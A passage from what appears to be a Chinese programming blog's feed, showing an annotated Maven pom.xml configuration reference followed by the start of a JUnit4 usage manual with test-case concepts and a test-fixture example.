class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">modules</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--发现依赖和扩展的远程仓库列表。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--参见repositories/repository元素 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--发现插件的远程仓库列表，这些插件用于构建和报表 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--包含需要连接到远程插件仓库的信息.参见repositories/repository元素 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。要获取更多信息，请看项目依赖机制。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                    ......</span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--不赞成使用. 现在Maven忽略该元素. --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">reports</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--该元素包括使用报表插件产生报表的规范。当用户执行&quot;mvn site&quot;，这些报表就会运行。 在页面导航栏能看到所有报表的链接。参见reporting元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">reporting</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">reporting</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见dependencyManagement元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        ......</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见distributionManagement元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见properties元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--模块（有时称作子项目） 被构建成项目的一部分。列出的每个模块元素是指向该模块的目录的相对路径 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发现依赖和扩展的远程仓库列表。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包含需要连接到远程仓库的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--如何处理远程仓库里发布版本的下载 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--true或者false表示该仓库是否为下载某种类型构件（发布版，快照版）开启。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--该元素指定更新发生的频率。Maven会比较本地POM和远程POM的时间戳。这里的选项是：always（一直），daily（默认，每日），interval：X（这里X是以分钟为单位的时间间隔），或者never（从不）。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--当Maven验证构件校验文件失败时该怎么做：ignore（忽略），fail（失败），或者warn（警告）。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 如何处理远程仓库里快照版本的下载。有了releases和snapshots这两组配置，POM就可以在每个单独的仓库中，为每种类型的构件采取不同的 </span></span><br><span class="line"><span class="comment">                策略。例如，可能有人会决定只为开发目的开启对快照版本下载的支持。参见repositories/repository/releases元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">updatePolicy</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">checksumPolicy</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--远程仓库唯一标识符。可以用来匹配在settings.xml文件里配置的远程仓库 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-repository-proxy<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--远程仓库名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon-repository-proxy<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--远程仓库URL，按protocol://hostname/path形式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.1.169:9999/repository/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 用于定位和排序构件的仓库布局类型-可以是default（默认）或者legacy（遗留）。Maven 2为其仓库提供了一个默认的布局；然 </span></span><br><span class="line"><span class="comment">                而，Maven 1.x有一种不同的布局。我们可以使用该元素指定布局是default（默认）还是legacy（遗留）。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span>&gt;</span>default<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发现插件的远程仓库列表，这些插件用于构建和报表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包含需要连接到远程插件仓库的信息.参见repositories/repository元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            ......</span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--该元素描述了项目相关的所有依赖。 这些依赖组成了项目构建过程中的一个个环节。它们自动从项目定义的仓库中下载。要获取更多信息，请看项目依赖机制。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖的group ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖的artifact ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-artifact<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖的版本号。 在Maven 2里, 也可以配置成版本号的范围。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 依赖类型，默认类型是jar。它通常表示依赖的文件的扩展名，但也有例外。一个类型可以被映射成另外一个扩展名或分类器。类型经常和使用的打包方式对应， </span></span><br><span class="line"><span class="comment">                尽管这也有例外。一些类型的例子：jar，war，ejb-client和test-jar。如果设置extensions为 true，就可以在 plugin里定义新的类型。所以前面的类型的例子不完整。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 依赖的分类器。分类器可以区分属于同一个POM，但不同构建方式的构件。分类器名被附加到文件名的版本号后面。例如，如果你想要构建两个单独的构件成 </span></span><br><span class="line"><span class="comment">                JAR，一个使用Java 1.4编译器，另一个使用Java 6编译器，你就可以使用分类器来生成两个单独的JAR构件。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">classifier</span>&gt;</span><span class="tag">&lt;/<span class="name">classifier</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--依赖范围。在项目发布过程中，帮助决定哪些构件被包括进来。欲知详情请参考依赖机制。 - compile ：默认范围，用于编译 - provided：类似于编译，但支持你期待jdk或者容器提供，类似于classpath </span></span><br><span class="line"><span class="comment">                - runtime: 在执行时需要使用 - test: 用于test任务时使用 - system: 需要外在提供相应的元素。通过systemPath来取得 </span></span><br><span class="line"><span class="comment">                - systemPath: 仅用于范围为system。提供相应的路径 - optional: 当项目自身被依赖时，标注依赖是否传递。用于连续依赖时使用 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--仅供system范围使用。注意，不鼓励使用这个元素，并且在新的版本中该元素可能被覆盖掉。该元素为依赖规定了文件系统上的路径。需要绝对路径而不是相对路径。推荐使用属性匹配绝对路径，例如$&#123;java.home&#125;。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span><span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--当计算传递依赖时， 从依赖构件列表里，列出被排除的依赖构件集。即告诉maven你只依赖指定的项目，不依赖项目的依赖。此元素主要用于解决版本冲突问题 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--可选依赖，如果你在项目B中把C依赖声明为可选，你就需要在依赖于B的项目（例如项目A）中显式的引用对C的依赖。可选依赖阻断依赖的传递性。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不赞成使用. 现在Maven忽略该元素. --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">reports</span>&gt;</span><span class="tag">&lt;/<span class="name">reports</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--该元素描述使用报表插件产生报表的规范。当用户执行&quot;mvn site&quot;，这些报表就会运行。 在页面导航栏能看到所有报表的链接。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">reporting</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--true，则，网站不包括默认的报表。这包括&quot;项目信息&quot;菜单中的报表。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">excludeDefaults</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--所有产生的报表存放到哪里。默认值是$&#123;project.build.directory&#125;/site。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outputDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--使用的报表插件和他们的配置。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--plugin元素包含描述报表插件需要的信息 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--报表插件在仓库里的group ID --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--报表插件在仓库里的artifact ID --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--被使用的报表插件的版本（或版本范围） --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--任何配置是否被传播到子项目 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--报表插件的配置 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--一组报表的多重规范，每个规范可能有不同的配置。一个规范（报表集）对应一个执行目标 。例如，有1，2，3，4，5，6，7，8，9个报表。1，2，5构成A报表集，对应一个执行目标。2，5，8构成B报表集，对应另一个执行目标 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">reportSets</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--表示报表的一个集合，以及产生该集合的配置 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">reportSet</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--报表集合的唯一标识符，POM继承时用到 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--产生报表集合时，被使用的报表的配置 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--配置是否被继承到子POMs --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--这个集合里使用到哪些报表 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">reports</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">reportSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">reportSets</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">reporting</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 继承自该项目的所有子项目的默认依赖信息。这部分的依赖信息不会被立即解析,而是当子项目声明一个依赖（必须描述group ID和 artifact </span></span><br><span class="line"><span class="comment">        ID信息），如果group ID和artifact ID以外的一些信息没有描述，则通过group ID和artifact ID 匹配到这里的依赖，并使用这里的依赖信息。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目分发信息，在执行mvn deploy后表示要发布的位置。有了这些信息就可以把网站部署到远程服务器或者把构件部署到远程仓库。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--部署项目产生的构件到远程仓库需要的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--是分配给快照一个唯一的版本号（由时间戳和构建流水号）？还是每次都使用相同的版本号？参见repositories/repository元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">uniqueVersion</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-maven2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon maven2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>file://$&#123;basedir&#125;/target/deploy<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构件的快照部署到哪里？如果没有配置该元素，默认部署到repository元素配置的仓库，参见distributionManagement/repository元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">uniqueVersion</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-maven2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Banseon-maven2 Snapshot Repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>scp://svn.baidu.com/banseon:/usr/local/maven-snapshot<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">layout</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--部署项目的网站需要的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">site</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--部署位置的唯一标识符，用来匹配站点和settings.xml文件里的配置 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>banseon-site<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--部署位置的名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>business api website<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--部署位置的URL，按protocol://hostname/path形式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">                scp://svn.baidu.com/banseon:/var/www/localhost/banseon-web</span><br><span class="line">            <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">site</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--项目下载页面的URL。如果没有该元素，用户应该参考主页。使用该元素的原因是：帮助定位那些不在仓库里的构件（由于license限制）。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">downloadUrl</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--如果构件有了新的group ID和artifact ID（构件移到了新的位置），这里列出构件的重定位信息。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构件新的group ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构件新的artifact ID --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构件新的版本号 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--显示给用户的，关于移动的额外信息，例如原因。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 给出该构件在远程仓库的状态。不得在本地项目中设置该元素，因为这是工具自动更新的。有效的值有：none（默认），converted（仓库管理员从 </span></span><br><span class="line"><span class="comment">            Maven 1 POM转换过来），partner（直接从伙伴Maven 2仓库同步过来），deployed（从Maven 2实例部 署），verified（被核实时正确的和最终的）。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">status</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--以值替代名称，Properties可以在整个POM中使用，也可以作为触发条件（见settings.xml配置文件里activation元素的说明）。格式是&lt;name&gt;value&lt;/name&gt;。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;脱离IDE，本地（Maven、Gradle、JDK、Ant）/在线（Travis-CI）build Java项目的步骤。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>JUnit使用手册</title>
    <link href="https://www.fvolcano.red/2021/manual-of-JUnit/"/>
    <id>https://www.fvolcano.red/2021/manual-of-JUnit/</id>
    <published>2021-05-11T11:20:35.000Z</published>
    <updated>2021-05-11T11:20:35.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/manual-of-JUnit/image-20210517194801837.png" alt="image-20210517194801837"><a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.guru99.com/junit-tutorial.html">JUnit Tutorial for Beginners: Learn in 3 Days</a></li><li><a href="https://github.com/junit-team/junit4">junit4 github</a></li><li><a href="https://www.vogella.com/tutorials/JUnit/article.html">Unit Testing with JUnit 5 - Tutorial</a></li><li><a href="https://junit.org/junit5/docs/current/user-guide/#overview">JUnit 5 User Guide</a></li></ol><h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>package: org.Junit</p><h2 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h2><h3 id="Test-Case"><a href="#Test-Case" class="headerlink" title="Test Case"></a><a href="https://www.guru99.com/test-case.html">Test Case</a></h3><p>A test case is a set of actions executed to verify a particular feature or functionality of your software application. A Test Case contains test steps, test data, precondition, postcondition developed for specific test scenario to verify any requirement. </p><p>For a <a href="https://www.guru99.com/test-scenario.html">Test Scenario</a>: Check Login Functionality there many possible test cases are:</p><ul><li>Test Case 1: Check results on entering valid User Id &amp; Password</li><li>Test Case 2: Check results on entering Invalid User ID &amp; Password</li><li>Test Case 3: Check response when a User ID is Empty &amp; Login Button is pressed, and many more</li></ul><h3 id="Test-fixture"><a href="#Test-fixture" class="headerlink" title="Test fixture"></a>Test fixture</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OutputFileTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> File output; </span><br><span class="line">    <span class="meta">@Before</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createOutputFile</span><span class="params">()</span> </span>&#123; </span><br><span class="line">       output = <span class="keyword">new</span> File(...);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">true<span class="meta">@After</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteOutputFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        output.delete(); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFile1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">// code for test case objective</span></span><br><span class="line">    &#125; </span><br><span class="line">true<span class="meta">@Test</span> </span><br><span class="line">    <span class="function"><span 